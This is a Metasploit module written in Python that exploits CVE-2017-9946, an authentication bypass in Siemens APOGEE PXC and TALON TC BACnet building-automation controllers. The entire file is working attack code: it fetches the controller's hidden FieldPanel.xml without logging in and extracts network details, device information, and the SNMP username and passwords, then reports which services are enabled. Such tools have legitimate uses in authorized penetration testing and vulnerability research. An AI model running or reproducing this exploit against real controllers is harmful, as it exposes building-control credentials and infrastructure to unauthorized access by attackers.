#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# 2022-05-23

# Standard Modules
from metasploit import module

# Extra Dependencies
dependencies_missing = False
try:
    import logging
    import requests
    import xmltodict
    import xml.etree.ElementTree as ET
    import socket
    import struct
except ImportError:
    dependencies_missing = True

# Metasploit Metadata
metadata = {
    'name': 'Siemens BACnet Field Panel Path Traversal',
    'description': '''
        This module exploits a hidden directory on Siemens APOGEE PXC BACnet Automation Controllers (all versions prior to V3.5), and TALON TC BACnet Automation Controllers (all versions prior to V3.5). With a 7.5 CVSS, this exploit allows for an attacker to perform an authentication bypass using an alternate path or channel to enumerate hidden directories in the web server.
    ''',
    'authors': [
        'RoseSecurity',
    ],
    'date': '2022-05-23',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://sid.siemens.com/v/u/A6V10304985'},
        {'type': 'cve', 'ref': 'https://nvd.nist.gov/vuln/detail/CVE-2017-9946'},
    ],
    'type': 'single_scanner',
    'options': {
        'rhost': {'type': 'string', 'description': 'Target address', 'required': True, 'default': None},
    }
}

def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    try:
        # Download Hidden XML File
        r = requests.get('http://{}/{}'.format(args['rhost'], '/FieldPanel.xml'), verify=False)

        # Convert to Readable Format
        xml_doc = r.content
        root = ET.fromstring(xml_doc)

        # Parse XML for Sensitive Data
        module.log("Remote Site ID: " + root[18].text)
        module.log("Building Level Network Name: " + root[26].text)
        module.log("Site Name: " + root[27].text)
        module.log("Hostname: " + root[28].text)
        ip_addr = int(root[30].text, 16)
        module.log("IP Address: " + socket.inet_ntoa(struct.pack(">L", ip_addr)))
        gw_addr = int(root[32].text, 16)
        gw_addr = str(socket.inet_ntoa(struct.pack(">L", gw_addr)))
        module.log("Gateway IP Address: " + gw_addr)
        module.log("Maximum Transmission Size: " + root[57].text)
        module.log("BACnet Device Name: " + root[60].text)
        module.log("BACnet UDP Port: " + root[62].text)
        module.log("Device Location: " + root[63].text)
        module.log("Device Description: " + root[64].text)
        module.log("Device Barcode: " + root[88].text)
        module.log("Device Revision String: " + root[104].text)
        module.log("Device Firmware: " + root[105].text)
        module.log("Panel Key Name: " + root[109].text)
        module.log("SNMP Username: " + root[148].text)
        module.log("SNMP Private Password: " + root[149].text)
        module.log("SNMP Authorization Password: " + root[150].text)

        # Determine Running Services
        if int(root[48].text) == 1:
            module.log("Telnet Enabled")
        else:
            module.log("Telnet Disabled")

        if int(root[84].text) == 1:
            module.log("Wireless Enabled")
        else:
            module.log("Wireless Disabled")

        if int(root[103].text) == 3:
            module.log("Webserver Enabled")
        else:
            module.log("Webserver Disabled")

    except requests.exceptions.RequestException as e:
        logging.error('{}'.format(e))
        return


if __name__ == '__main__':
    module.run(metadata, run)

